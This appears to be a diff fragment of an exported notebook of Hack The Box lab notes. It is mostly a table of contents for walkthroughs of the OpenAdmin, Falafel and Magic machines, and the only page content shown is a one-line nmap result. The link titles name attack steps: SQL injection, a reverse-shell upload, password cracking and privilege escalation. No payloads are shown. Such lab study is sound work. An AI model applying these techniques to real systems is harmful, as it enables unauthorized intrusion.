+<li><a href="HacktheBox--Linux_Boxes--openadmin--http--gobuster.html">gobuster</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--http---ona.html">/ona</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--http---ona--gobuster_10.10.10.171-ona.html">gobuster 10.10.10.171/ona</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--http---ona--gobuster_10.10.10.171-ona--login.php.html">login.php</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--initial_foothold--opennetadmin.sh_script_error_&_reddit_post_help.html">opennetadmin.sh script error & reddit post help</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--initial_foothold--opennetadmin.sh_script_error_&_reddit_post_help--script_fix.html">script fix</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--initial_foothold--rev.php.html">rev.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--initial_foothold--user_enumeration.html">user enumeration</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_jimmy.html">priv esc to jimmy</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_jimmy--ssh_jimmy@10.10.10.171.html">ssh jimmy@10.10.10.171</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_joanna.html">priv esc to joanna</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_joanna--main.php.html">main.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_joanna--check_internal_listening_ports_w-_ss_-lntp.html">check internal listening ports w/ ss -lntp</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_joanna--curl_127.0.0.152846.html">curl 127.0.0.1:52846</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_joanna--ssh2john.html">ssh2john</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_joanna--john_brute_force.html">john brute force</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_joanna--ssh_to_joanna.html">ssh to joanna</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_root.html">priv esc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--priv_esc_to_root--sudo_-bin-nano_-opt-priv.html">sudo /bin/nano /opt/priv</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel.html">falafel</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php.html">/login.php</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php--sqlmap.html">sqlmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php--wfuzz.html">wfuzz</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php--wfuzz--wfuzz_-hw_657.html">wfuzz -hw 657</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php--crackstation.html">crackstation</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php--manual_sql_injection_(blind_boolean).html">manual sql injection (blind boolean)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php--manual_sql_injection_(blind_boolean)--username=admin'.html">username=admin'</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php--manual_sql_injection_(blind_boolean)--exploit.py.html">exploit.py</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--gobuster---login.php--chris_login.html">chris login</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--php_variable_juggling.html">php variable juggling</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--php_variable_juggling--google_php_0e_hash_collision.html">google php 0e hash collision</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--php_variable_juggling--admin_login.html">admin login</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--upload.php.html">upload.php</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--upload.php--test.png.html">test.png</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--upload.php--send_php_rev_shell_with_magic_bytes.html">send php rev shell with magic bytes</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--upload.php--linux_filename_character_limit.html">linux filename character limit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--upload.php--linux_filename_character_limit--cmd_execution.html">cmd execution</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--http--upload.php--linux_filename_character_limit--reverse_shell.html">reverse shell</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--privesc_to_moshe.html">privesc to moshe</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--privesc_to_moshe--connection.php.html">connection.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--privesc_to_moshe--priv_esc_with_leaked_creds.html">priv esc with leaked creds</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_yossi.html">priv esc to yossi</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_yossi--fb0.html">fb0</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_yossi--pnmtopng.html">pnmtopng</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_yossi--pnmtopng--raw2png.html">raw2png</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_yossi--ssh_into_yossi.html">ssh into yossi</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_root.html">priv esc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_root--debugfs.html">debugfs</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_root--debugfs---root.html">/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_root--debugfs--.ssh.html">.ssh</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--priv_esc_to_root--ssh_into_root.html">ssh into root</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--falafel--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--falafel--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--magic.html">magic</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--gobuster.html">gobuster</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--login.php.html">login.php</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--login.php--manual.html">manual</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--login.php--sqlmap.html">sqlmap</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--upload.php.html">upload.php</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--upload.php--duck.jpg.html">duck.jpg</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--upload.php--cmd.php.png.html">cmd.php.png</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--upload.php--cmd.php.png--url.html">url</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--upload.php--revshell.py.html">revshell.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--initial_foothold--upload.php--revshell.py--tcp_backconnect.py.html">tcp_backconnect.py</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_theseus.html">priv esc to theseus</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_theseus--db.php5.html">db.php5</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_theseus--mysql.html">mysql</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root.html">priv esc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root--lse.sh_-l_1.html">lse.sh -l 1</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root--linpeas.html">linpeas</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root--systemctl_list-timers.html">systemctl list-timers</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root--ltrace_-bin-sysinfo.html">ltrace /bin/sysinfo</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root--ltrace_-bin-sysinfo--lshw.html">lshw</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root--ltrace_-bin-sysinfo--hijack_lshw_PATH.html">hijack lshw PATH</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root--ltrace_-bin-sysinfo--run_sysinfo.html">run sysinfo</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--priv_esc_to_root--ltrace_-bin-sysinfo--run_sysinfo--problem,_no_output.html">problem, no output</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--magic--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--magic--lessons_learned.html">lessons learned</a></li>
+</ol></ol></div>
+<div class="page"><h1><b><u>nmap</u></b></h1><h2>nmap shows standard ports 22 and 80 open</h2><br /><br /><img src="images/1804-1.png" alt="images/1804-1.png" /></div></div>
+</body></html>
